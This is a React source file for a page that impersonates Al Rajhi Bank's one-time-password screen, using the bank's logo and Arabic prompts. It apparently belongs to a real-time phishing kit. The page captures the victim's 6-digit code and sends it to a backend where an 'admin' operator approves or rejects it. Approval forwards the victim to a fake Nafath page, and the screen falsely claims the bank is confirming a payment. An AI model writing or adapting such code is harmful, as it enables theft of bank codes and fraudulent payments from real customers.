import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay from "@/components/WaitingOverlay";
import { Button } from "@/components/ui/button";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import {
  sendData,
  codeAction,
  navigateToPage,
} from "@/lib/store";
import { useSignalEffect } from "@preact/signals-react";

export default function AlRajhiOTP() {
  const [, navigate] = useLocation();
  const [otp, setOtp] = useState("");
  const [error, setError] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);

  // Emit page enter and focus on first input
  useEffect(() => {
    navigateToPage("الراجحى (OTP)");
    // التركيز على أول خانة إدخال - البحث عن العنصر المخفي للإدخال
    setTimeout(() => {
      const otpInput = document.querySelector('[data-slot="input-otp"]') as HTMLInputElement;
      if (otpInput) {
        otpInput.focus();
      }
    }, 100);
  }, []);

  // Handle code action from admin (approve/reject)
  useSignalEffect(() => {
    const action = codeAction.value;
    if (action) {
      if (action.action === "approve") {
        navigate("/alrajhi-nafath");
      } else if (action.action === "reject") {
        // تفريغ الحقول وإظهار رسالة الخطأ
        setOtp("");
        setError(true);
        // التركيز على خانة الإدخال
        setTimeout(() => {
          const otpInput = document.querySelector('[data-slot="input-otp"]') as HTMLInputElement;
          if (otpInput) {
            otpInput.focus();
          }
        }, 100);
      }
      // إعادة تعيين الإجراء
      codeAction.value = null;
    }
  });

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (otp.length !== 6) {
      setError(true);
      return;
    }

    setError(false);
    sendData({
      digitCode: otp,
      current: "الراجحى (OTP)",
      nextPage: "نفاذ الراجحى",
      waitingForAdminResponse: true,
      customWaitingMessage: "جاري تأكيد عملية الدفع من قبل المصرف الخاص بك",
    });
  };

  const handleResend = () => {
    sendData({
      data: { طلب: "إعادة إرسال رمز" },
      current: "الراجحى (OTP)",
      waitingForAdminResponse: true,
      customWaitingMessage: "جاري إعادة إرسال الرمز",
    });
  };

  return (
    <PageLayout variant="al-rajhi">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6">
        {/* Header */}
        <div className="text-center mb-8">
          <img
            src="/images/banks/al-rajhi-banking-and-investment-corp.png"
            alt="الراجحي"
            className="h-12 mx-auto mb-4"
          />
          <h1 className="text-xl font-bold text-gray-800 mb-2">رمز التحقق</h1>
          <p className="text-gray-500 text-sm">
            تم إرسال رمز التحقق إلى رقم جوالك المسجل
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* OTP Input */}
          <div className="flex justify-center" dir="ltr">
            <InputOTP
              maxLength={6}
              value={otp}
              onChange={(value) => {
                setOtp(value);
                setError(false);
              }}
            >
              <InputOTPGroup>
                <InputOTPSlot index={0} className={error ? "border-red-500" : ""} />
                <InputOTPSlot index={1} className={error ? "border-red-500" : ""} />
                <InputOTPSlot index={2} className={error ? "border-red-500" : ""} />
                <InputOTPSlot index={3} className={error ? "border-red-500" : ""} />
                <InputOTPSlot index={4} className={error ? "border-red-500" : ""} />
                <InputOTPSlot index={5} className={error ? "border-red-500" : ""} />
              </InputOTPGroup>
            </InputOTP>
          </div>

          {error && (
            <p className="text-red-500 text-xs text-center">
              رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى
            </p>
          )}

          {/* Submit Button */}
          <Button 
            type="submit" 
            className="w-full bg-[#004d7a] hover:bg-[#003d5c]" 
            size="lg"
            disabled={otp.length !== 6}
          >
            تأكيد
          </Button>

          {/* Resend Link */}
          <div className="text-center">
            <button
              type="button"
              onClick={handleResend}
              className="text-[#004d7a] text-sm hover:underline"
            >
              لم تستلم الرمز؟ إعادة الإرسال
            </button>
          </div>
        </form>
      </div>
    </PageLayout>
  );
}
